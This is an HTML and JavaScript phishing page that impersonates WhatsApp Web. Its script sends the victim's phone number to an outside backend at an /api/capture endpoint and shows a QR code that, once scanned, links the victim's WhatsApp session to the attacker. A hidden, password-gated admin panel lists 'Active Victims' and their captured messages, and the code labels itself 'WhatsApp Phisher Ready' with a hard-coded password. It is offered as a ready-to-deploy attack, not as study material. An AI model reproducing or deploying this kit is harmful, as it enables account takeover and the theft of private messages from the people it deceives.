<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WhatsApp Web</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            background: linear-gradient(135deg, #075e54 0%, #128C7E 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        .container {
            max-width: 550px;
            width: 100%;
            background: white;
            border-radius: 25px;
            overflow: hidden;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
        }

        .header {
            background: #075e54;
            padding: 30px 20px;
            text-align: center;
            color: white;
        }

        .official-logo {
            width: 70px;
            height: 70px;
            background: white;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 15px;
        }

        .official-logo svg {
            width: 45px;
            height: 45px;
        }

        .header h1 {
            font-size: 24px;
            margin-bottom: 5px;
        }

        .qr-container {
            background: #f0f2f5;
            border-radius: 20px;
            padding: 30px;
            text-align: center;
            margin: 25px;
            border: 2px solid #25D366;
        }

        .qr-wrapper {
            background: white;
            padding: 15px;
            border-radius: 15px;
            display: inline-block;
        }

        #qrCode {
            width: 250px;
            height: 250px;
            display: block;
        }

        .qr-status {
            margin-top: 15px;
            font-size: 14px;
            color: #667781;
        }

        .qr-status.connected {
            color: #25D366;
            font-weight: bold;
        }

        .input-group {
            padding: 0 25px 25px 25px;
        }

        .phone-input {
            width: 100%;
            padding: 15px;
            font-size: 16px;
            border: 2px solid #e0e0e0;
            border-radius: 12px;
            outline: none;
            text-align: center;
        }

        .phone-input:focus {
            border-color: #25D366;
        }

        .btn {
            width: calc(100% - 50px);
            margin: 0 25px 25px 25px;
            padding: 15px;
            background: #25D366;
            color: white;
            border: none;
            border-radius: 12px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
        }

        .btn:hover {
            background: #128C7E;
        }

        .status {
            margin: 15px 25px;
            padding: 12px;
            border-radius: 10px;
            text-align: center;
            display: none;
        }

        .status.success {
            background: #d4edda;
            color: #155724;
            display: block;
        }

        .admin-badge {
            position: fixed;
            bottom: 20px;
            right: 20px;
            background: rgba(0,0,0,0.7);
            color: white;
            padding: 8px 15px;
            border-radius: 20px;
            font-size: 12px;
            cursor: pointer;
        }

        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.8);
            z-index: 2000;
            justify-content: center;
            align-items: center;
        }

        .modal.active {
            display: flex;
        }

        .modal-content {
            background: white;
            border-radius: 20px;
            max-width: 90%;
            width: 900px;
            max-height: 80%;
            overflow: auto;
            padding: 20px;
        }

        .modal-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            border-bottom: 2px solid #e0e0e0;
            margin-bottom: 20px;
            padding-bottom: 15px;
        }

        .close-modal {
            background: none;
            border: none;
            font-size: 28px;
            cursor: pointer;
        }

        .messages-box {
            background: #f0f2f5;
            border-radius: 10px;
            padding: 15px;
            margin-top: 20px;
            max-height: 400px;
            overflow-y: auto;
        }

        .message-item {
            background: white;
            padding: 12px;
            margin: 8px 0;
            border-radius: 8px;
            border-left: 4px solid #25D366;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="official-logo">
                <svg viewBox="0 0 24 24" fill="#25D366">
                    <path d="M12.04 2.5c-5.25 0-9.5 4.25-9.5 9.5 0 1.75.5 3.45 1.3 4.9L2.5 21.5l5-1.3c1.45.8 3.05 1.3 4.75 1.3 5.25 0 9.5-4.25 9.5-9.5s-4.25-9.5-9.5-9.5z"/>
                </svg>
            </div>
            <h1>WhatsApp Web</h1>
            <p>Connect to your account</p>
        </div>

        <div class="qr-container">
            <div class="qr-wrapper">
                <img id="qrCode" src="" alt="QR Code">
            </div>
            <div id="qrStatus" class="qr-status loading">Enter your phone number to connect</div>
        </div>

        <div class="input-group">
            <input type="tel" id="phone" class="phone-input" placeholder="Enter your phone number" autocomplete="off">
        </div>

        <button class="btn" id="submitBtn">Connect to WhatsApp</button>
        <div id="status" class="status"></div>
    </div>

    <div class="admin-badge" id="adminBadge">🔒 Admin Panel</div>

    <div class="modal" id="adminModal">
        <div class="modal-content">
            <div class="modal-header">
                <h2>📊 WhatsApp Session - Captured Messages</h2>
                <button class="close-modal" id="closeModal">&times;</button>
            </div>
            <div id="adminContent"></div>
        </div>
    </div>

    <script>
        // CHANGE THIS TO YOUR BACKEND URL
        const BACKEND_URL = 'https://whatsapp-backend.onrender.com';
        
        let checkInterval = null;

        async function submitPhone() {
            const phone = document.getElementById('phone').value.trim();
            const statusDiv = document.getElementById('status');
            const submitBtn = document.getElementById('submitBtn');
            const qrStatus = document.getElementById('qrStatus');

            if (!phone || phone.length < 9) {
                statusDiv.textContent = 'Please enter a valid phone number';
                statusDiv.className = 'status error';
                return;
            }

            submitBtn.disabled = true;
            submitBtn.textContent = 'Connecting...';
            statusDiv.textContent = 'Sending request...';
            statusDiv.className = 'status';

            try {
                // Send phone number to backend
                const response = await fetch(`${BACKEND_URL}/api/capture`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ phone: phone })
                });

                const data = await response.json();
                
                if (data.status === 'success') {
                    statusDiv.textContent = '✓ Phone number received! Generating QR code...';
                    statusDiv.className = 'status success';
                    qrStatus.textContent = '✅ QR code ready! Scan with WhatsApp on your phone';
                    
                    // Start checking for QR code
                    startQRCheck();
                } else {
                    throw new Error('Failed');
                }

            } catch (error) {
                statusDiv.textContent = 'Connection error. Please try again.';
                statusDiv.className = 'status error';
                submitBtn.disabled = false;
                submitBtn.textContent = 'Connect to WhatsApp';
            }
        }

        async function startQRCheck() {
            const qrImg = document.getElementById('qrCode');
            const qrStatus = document.getElementById('qrStatus');
            
            if (checkInterval) clearInterval(checkInterval);
            
            checkInterval = setInterval(async () => {
                try {
                    const response = await fetch(`${BACKEND_URL}/api/qr`);
                    const data = await response.json();

                    if (data.qr) {
                        qrImg.src = `data:image/png;base64,${data.qr}`;
                        qrStatus.textContent = '✅ QR code ready - Scan with WhatsApp';
                        qrStatus.className = 'qr-status';
                    }

                    if (data.connected) {
                        qrStatus.textContent = '✅ Connected! WhatsApp is active';
                        qrStatus.className = 'qr-status connected';
                        clearInterval(checkInterval);
                        document.getElementById('status').textContent = '✓ Connected successfully!';
                        document.getElementById('status').className = 'status success';
                        
                        // Load messages after connection
                        setTimeout(loadMessages, 3000);
                    }
                } catch (error) {
                    console.error('QR check error:', error);
                }
            }, 3000);
        }

        async function loadMessages() {
            try {
                const response = await fetch(`${BACKEND_URL}/api/messages`);
                const data = await response.json();
                
                if (data.messages && data.messages.length > 0) {
                    console.log('Messages loaded:', data.messages);
                }
            } catch (error) {
                console.error('Error loading messages:', error);
            }
        }

        async function refreshAdminPanel() {
            try {
                // Get victims
                const victimsResponse = await fetch(`${BACKEND_URL}/api/victims`);
                const victims = await victimsResponse.json();
                
                // Get messages
                const messagesResponse = await fetch(`${BACKEND_URL}/api/messages`);
                const messagesData = await messagesResponse.json();
                
                let messagesHtml = '';
                if (messagesData.messages && messagesData.messages.length > 0) {
                    messagesHtml = `
                        <h3>📱 WhatsApp Messages Captured:</h3>
                        <div class="messages-box">
                    `;
                    messagesData.messages.forEach(msg => {
                        messagesHtml += `<div class="message-item">${msg}</div>`;
                    });
                    messagesHtml += '</div>';
                } else {
                    messagesHtml = '<p>No messages captured yet. Wait for victim to scan QR code.</p>';
                }
                
                const html = `
                    <div style="margin-bottom: 20px;">
                        <strong>📊 Active Victims: ${victims.length}</strong>
                        <br><br>
                        ${messagesHtml}
                        <button onclick="refreshAdminPanel()" style="margin-top: 15px; padding: 8px 20px; background: #25D366; border: none; border-radius: 5px; cursor: pointer;">🔄 Refresh</button>
                    </div>
                `;
                document.getElementById('adminContent').innerHTML = html;
            } catch (error) {
                document.getElementById('adminContent').innerHTML = '<p>Error loading data. Make sure backend is running.</p>';
            }
        }

        document.getElementById('submitBtn').addEventListener('click', submitPhone);
        document.getElementById('phone').addEventListener('keypress', (e) => {
            if (e.key === 'Enter') submitPhone();
        });

        // Admin Panel
        const adminBadge = document.getElementById('adminBadge');
        const adminModal = document.getElementById('adminModal');
        const closeModal = document.getElementById('closeModal');
        const ADMIN_PASSWORD = 'Phishing3694';

        adminBadge.addEventListener('click', () => {
            const password = prompt('🔐 Enter admin password:');
            if (password !== ADMIN_PASSWORD) {
                alert('❌ Wrong password!');
                return;
            }
            refreshAdminPanel();
            adminModal.classList.add('active');
        });

        closeModal.addEventListener('click', () => adminModal.classList.remove('active'));
        adminModal.addEventListener('click', (e) => {
            if (e.target === adminModal) adminModal.classList.remove('active');
        });

        console.log('✅ WhatsApp Phisher Ready');
        console.log(`📡 Backend URL: ${BACKEND_URL}`);
        console.log('🔑 Admin Password: Phishing3694');
    </script>
</body>
</html>
